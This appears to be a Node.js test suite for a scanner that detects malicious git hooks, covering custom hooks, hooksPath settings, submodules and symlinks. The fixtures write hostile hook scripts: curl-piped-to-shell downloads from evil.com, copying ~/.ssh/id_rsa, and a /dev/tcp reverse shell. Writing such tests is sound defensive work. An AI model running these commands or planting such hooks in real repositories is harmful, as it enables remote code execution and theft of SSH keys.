'use strict';

const { describe, it, beforeEach, afterEach } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const os = require('os');

describe('git-hooks scanner', () => {
  let tmpDir;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'hg-githooks-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  function createHook(repoDir, hookName, content, executable = true) {
    const hooksDir = path.join(repoDir, '.git', 'hooks');
    fs.mkdirSync(hooksDir, { recursive: true });
    const hookPath = path.join(hooksDir, hookName);
    fs.writeFileSync(hookPath, content);
    if (executable) fs.chmodSync(hookPath, 0o755);
  }

  it('finds no hooks in a clean repo', () => {
    const repoDir = path.join(tmpDir, 'clean-repo');
    fs.mkdirSync(path.join(repoDir, '.git', 'hooks'), { recursive: true });
    // Add a sample hook (should be ignored)
    fs.writeFileSync(path.join(repoDir, '.git', 'hooks', 'pre-commit.sample'), '#!/bin/sh\nexit 0\n');

    const { scan } = require('../src/scanners/git-hooks');
    const result = scan({ projectRoots: [tmpDir] }, { maxDepth: 4 });
    assert.equal(result.findings.length, 0);
  });

  it('detects a safe custom hook as info', () => {
    const repoDir = path.join(tmpDir, 'safe-repo');
    createHook(repoDir, 'pre-commit', '#!/bin/sh\nnpm test\n');

    const { scan } = require('../src/scanners/git-hooks');
    const result = scan({ projectRoots: [tmpDir] }, { maxDepth: 4 });
    assert.equal(result.hooks_found, 1);
    assert.equal(result.findings.length, 1);
    assert.equal(result.findings[0].severity, 'info');
    assert.equal(result.findings[0].hook, 'pre-commit');
  });

  it('flags curl piped to bash in a hook', () => {
    const repoDir = path.join(tmpDir, 'evil-repo');
    createHook(repoDir, 'post-checkout', '#!/bin/sh\ncurl http://evil.com/payload | bash\n');

    const { scan } = require('../src/scanners/git-hooks');
    const result = scan({ projectRoots: [tmpDir] }, { maxDepth: 4 });
    assert.equal(result.suspicious, 1);
    const finding = result.findings.find(f => f.severity !== 'info');
    assert.ok(finding);
    assert.equal(finding.severity, 'critical');
    assert.ok(finding.triggers.includes('pipe-to-shell'));
  });

  it('flags credential access in hooks', () => {
    const repoDir = path.join(tmpDir, 'cred-repo');
    createHook(repoDir, 'post-merge', '#!/bin/sh\ncp ~/.ssh/id_rsa /tmp/stolen\n');

    const { scan } = require('../src/scanners/git-hooks');
    const result = scan({ projectRoots: [tmpDir] }, { maxDepth: 4 });
    const finding = result.findings.find(f => f.severity !== 'info');
    assert.ok(finding);
    assert.ok(finding.triggers.includes('credential-access'));
  });

  it('flags reverse shell in hooks', () => {
    const repoDir = path.join(tmpDir, 'rev-repo');
    createHook(repoDir, 'pre-push', '#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4242 0>&1\n');

    const { scan } = require('../src/scanners/git-hooks');
    const result = scan({ projectRoots: [tmpDir] }, { maxDepth: 4 });
    const finding = result.findings.find(f => f.severity !== 'info');
    assert.ok(finding);
    assert.equal(finding.severity, 'critical');
    assert.ok(finding.triggers.includes('bash-tcp'));
  });

  it('ignores non-hook files in hooks dir', () => {
    const repoDir = path.join(tmpDir, 'noise-repo');
    const hooksDir = path.join(repoDir, '.git', 'hooks');
    fs.mkdirSync(hooksDir, { recursive: true });
    fs.writeFileSync(path.join(hooksDir, 'random-file.sh'), '#!/bin/sh\ncurl evil.com | bash\n');

    const { scan } = require('../src/scanners/git-hooks');
    const result = scan({ projectRoots: [tmpDir] }, { maxDepth: 4 });
    assert.equal(result.findings.length, 0);
  });

  it('handles repos with multiple hooks', () => {
    const repoDir = path.join(tmpDir, 'multi-repo');
    createHook(repoDir, 'pre-commit', '#!/bin/sh\nnpm test\n');
    createHook(repoDir, 'post-checkout', '#!/bin/sh\ncurl http://evil.com | bash\n');
    createHook(repoDir, 'commit-msg', '#!/bin/sh\nexit 0\n');

    const { scan } = require('../src/scanners/git-hooks');
    const result = scan({ projectRoots: [tmpDir] }, { maxDepth: 4 });
    assert.equal(result.hooks_found, 3);
    assert.equal(result.findings.length, 3);
    assert.equal(result.suspicious, 1);
  });
});

describe('git-hooks coverage gaps', () => {
  const { scan, readHooksPath } = require('../src/scanners/git-hooks');
  let tmp;
  beforeEach(() => { tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hg-gh2-')); });
  afterEach(() => { fs.rmSync(tmp, { recursive: true, force: true }); });

  const write = (p, c) => { fs.mkdirSync(path.dirname(p), { recursive: true }); fs.writeFileSync(p, c); };
  const evil = '#!/bin/sh\ncurl http://evil.example/p | sh\n';

  it('flags reference-transaction and other less common hooks', () => {
    write(path.join(tmp, 'r', '.git', 'hooks', 'reference-transaction'), evil);
    write(path.join(tmp, 'r', '.git', 'hooks', 'pre-merge-commit'), evil);
    const r = scan({ projectRoots: [tmp] }, { maxDepth: 4 });
    assert.equal(r.suspicious, 2);
  });

  it('scans a repo-level core.hooksPath (husky style)', () => {
    write(path.join(tmp, 'r', '.git', 'config'), '[core]\n\thooksPath = .husky/_\n');
    write(path.join(tmp, 'r', '.husky', '_', 'pre-commit'), evil);
    const r = scan({ projectRoots: [tmp] }, { maxDepth: 4 });
    const f = r.findings.find(x => x.severity !== 'info');
    assert.ok(f);
    assert.equal(f.origin, 'core.hooksPath (repo)');
  });

  it('scans a global core.hooksPath from ~/.gitconfig', () => {
    const home = path.join(tmp, 'home');
    write(path.join(home, '.gitconfig'), '[user]\n\tname = x\n[core]\n\thooksPath = "~/.githooks"\n');
    write(path.join(home, '.githooks', 'post-checkout'), evil);
    const r = scan({ projectRoots: [], gitConfigPaths: [path.join(home, '.gitconfig')] }, { maxDepth: 4 });
    assert.equal(r.suspicious, 1);
    assert.equal(r.findings[0].origin, 'core.hooksPath (global)');
  });

  it('follows a .git file (submodule/worktree) to its git dir', () => {
    write(path.join(tmp, 'main', '.git', 'modules', 'sub', 'hooks', 'post-checkout'), evil);
    write(path.join(tmp, 'main', 'sub', '.git'), 'gitdir: ../.git/modules/sub\n');
    const r = scan({ projectRoots: [path.join(tmp, 'main', 'sub')] }, { maxDepth: 2 });
    assert.equal(r.suspicious, 1);
  });

  it('readHooksPath only reads the [core] section', () => {
    const cfg = path.join(tmp, 'cfg');
    fs.writeFileSync(cfg, '[alias]\n\thookspath = nope\n[core]\n\tbare = false\n\thooksPath = /opt/hooks ; comment\n');
    assert.equal(readHooksPath(cfg), '/opt/hooks');
  });
});

describe('git-hooks symlinks', () => {
  const { scan } = require('../src/scanners/git-hooks');
  let tmp;
  beforeEach(() => { tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hg-gh3-')); });
  afterEach(() => { fs.rmSync(tmp, { recursive: true, force: true }); });

  it('reports a hook symlinked outside the repo without reading it', { skip: process.platform === 'win32' }, () => {
    const hooks = path.join(tmp, 'r', '.git', 'hooks');
    fs.mkdirSync(hooks, { recursive: true });
    fs.writeFileSync(path.join(tmp, 'payload.sh'), '#!/bin/sh\nnpm test\n');
    fs.symlinkSync(path.join(tmp, 'payload.sh'), path.join(hooks, 'pre-commit'));
    const r = scan({ projectRoots: [path.join(tmp, 'r')] }, { maxDepth: 1 });
    assert.equal(r.findings.length, 1);
    assert.deepEqual(r.findings[0].triggers, ['symlink-outside-repo']);
    assert.equal(r.findings[0].severity, 'medium');
  });

  it('reads a hook symlinked to a script inside the repo', { skip: process.platform === 'win32' }, () => {
    const repo = path.join(tmp, 'r');
    fs.mkdirSync(path.join(repo, '.git', 'hooks'), { recursive: true });
    fs.mkdirSync(path.join(repo, 'scripts'));
    fs.writeFileSync(path.join(repo, 'scripts', 'pre-commit.sh'), '#!/bin/sh\ncurl http://evil.example | sh\n');
    fs.symlinkSync(path.join(repo, 'scripts', 'pre-commit.sh'), path.join(repo, '.git', 'hooks', 'pre-commit'));
    const r = scan({ projectRoots: [repo] }, { maxDepth: 1 });
    assert.ok(r.findings[0].triggers.includes('pipe-to-shell'));
  });
});
